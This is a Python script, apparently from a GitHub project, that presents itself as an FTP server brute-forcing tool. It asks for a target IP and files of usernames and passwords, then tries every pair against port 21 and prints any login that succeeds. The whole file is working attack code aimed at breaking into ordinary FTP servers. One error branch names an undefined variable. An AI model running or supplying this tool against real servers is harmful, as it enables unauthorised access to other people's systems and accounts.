import ftplib
import socket
import os
import sys

def TryLogin(usr, passW, ip):
    server = ftplib.FTP()
    server.connect(ip,21)
    try:
        server.login(usr.strip(),passW.strip())
        server.dir()
        print('[+] Credentials successfully found! Usr - ['+usr+'] & Pass - ['+passW+']')
    except Exception as e:
        print(f"/> Invalid Credentials! Usr : {usr.strip()} - Pass : {passW.strip()}")
        print(e)

def checkIpAddress(ip):
    try:
        socket.inet_aton(ip)
        return True
    except:
        return False

def checkIfPathExists(path):
    if os.path.exists(path):
        return True
    else:
        return False


print(r"""
  _____ _           _                                  ____
 |  ___| |_ _ __   | |    ___   __ _  __ _  ___ _ __  |  _ \ _   _
 | |_  | __| '_ \  | |   / _ \ / _` |/ _` |/ _ \ '__| | |_) | | | |
 |  _| | |_| |_) | | |__| (_) | (_| | (_| |  __/ |    |  __/| |_| |
 |_|    \__| .__/  |_____\___/ \__, |\__, |\___|_|    |_|    \__, |
           |_|                 |___/ |___/                   |___/ """)
print("")
print("****************************************************************")
print("> Copyright © 2021 of MishDotCom [@github]")
print("> Ftp Server bruteforcing tool made with python.")
print("****************************************************************\n")

ip = input("~$ Enter target ftp server: ")

if checkIpAddress(ip):
    print('[+] Target locked -> ' + ip)
    raw_usrLst_path = input("~$ Enter usrnames file path: ")
    if checkIfPathExists(raw_usrLst_path):
        print('[+] UsrLst path locked.')
        usrLstPath = raw_usrLst_path
        raw_passLst_path = input('~$ Enter passlst file path: ')
        if checkIfPathExists(raw_passLst_path):
            print('[+] PassLst path locked.')
            passLstPath = raw_passLst_path
            print('[?] Start parsing data from given files.')
            usrnames = open(usrLstPath, "r").readlines()
            passwords = open(passLstPath, "r").readlines()
            print('[+] Done parsing data prom files.')
            confirm = input('[!] ~$ Confirm attack: [y/n] ')
            confirm = confirm.lower()
            if confirm == 'y':
                print('')
                for usr in usrnames:
                    for passK in passwords:
                        TryLogin(usr, passK, ip)
            else:
                print('[?] Attack canceled!')

        else:
            print('Invalid filepath ['+raw_passLst_pathLst_path+']')
    else:
        print('Invalid filepath ['+raw_usrLst_path+']')
else:
    print('Invalid Ip Address ['+ip+']!')